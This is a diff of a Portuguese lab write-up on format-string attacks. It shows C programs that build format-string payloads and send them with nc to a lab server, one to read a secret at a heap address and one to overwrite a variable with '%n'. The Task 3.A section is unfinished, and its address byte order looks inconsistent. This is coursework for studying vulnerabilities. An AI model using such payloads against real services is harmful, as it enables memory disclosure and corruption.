@@ -62,7 +62,7 @@ Conclui-se assim que nesta configuração do programa, para imprimir os primeiro
 
 Nesta tarefa necessitamos de imprimir o conteúdo de uma string presente na Heap no endereço 0x080b4008. Como o programa a ser executado no servidor é o mesmo da tarefa anterior, então usaremos os mesmos princípios.
 
-O endereço 0x080b4008 pode ser codificado em string como "\x08\x0b\x40\x08". Ao colocarmos este endereço no início do input seguido de 63 "%08x" e um "%s", então a format string irá ler deste endereço e retornar o valor da string escondida para o output. <br>
+O endereço 0x080b4008 pode ser codificado em string como "\x08\x0b\x40\x08". Ao colocarmos este endereço no início do input seguido de 63 "%08x" e um "%s", então a format string irá ler deste endereço e retornar o valor escondido. <br>
 O código executado foi o seguinte:
 
 ```c
@@ -70,18 +70,16 @@ O código executado foi o seguinte:
 #include <stdlib.h>
 
 int main() {
-    char cmd[295] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";
+    char cmd[296] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";
     
     system(cmd);
     return 0;
 }
 ```
 
-O output foi o seguinte:
+O output do lado do servidor foi o seguinte:
 
-```
-
-```
+![Task 2 B](../img/lab6task2b.png)
 
 Conclui-se então que a mensagem do endereço é `"A secret message"`.
 
@@ -89,4 +87,26 @@ Conclui-se então que a mensagem do endereço é `"A secret message"`.
 
 ### Task 3.A
 
+Nesta tarefa necessitamos de mudar o valor da variável `target`. Inicialmente o seu valor é 0x11223344 e o endereço é 0x080e5068.
+
+O comando `%n` nas format strings escreve na zona de memória do argumento passado como parâmetro o número de caracteres escritos até ali. A abordagem é muito semelhante ao comando da tarefa 2.B, só que em vez de ler do endereço selecionado, vamos escrever. <br>
+O código executado foi o seguinte:
+
+```c
+#include <string.h>
+#include <stdlib.h>
+
+int main() {
+    char cmd[296] = "echo \x08\x0e\x50\x68%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
+    
+    system(cmd);
+    return 0;
+}
+```
+
+O output do lado do servidor foi o seguinte:
+
+#TODO -> print ou texto
+
 ### Task 3.B
+
